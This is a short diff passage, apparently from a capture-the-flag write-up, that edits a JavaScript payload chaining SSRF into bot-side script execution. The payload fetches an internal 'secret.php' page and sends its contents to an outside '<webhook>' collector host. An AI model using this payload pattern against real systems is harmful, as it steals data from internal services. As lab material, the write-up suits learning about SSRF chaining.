@@ -42,4 +42,4 @@ This "bridge" between SSRF → internal fetch → bot JS execution is why the ch
 ```javascript
 api=http://web/console.php?cmd=fetch('http://web/secret.php')
   .then(res => res.text())
-  .then(data => fetch('?flag=' + encodeURIComponent(data)))
+  .then(data => fetch('<webhook>?flag=' + encodeURIComponent(data)))
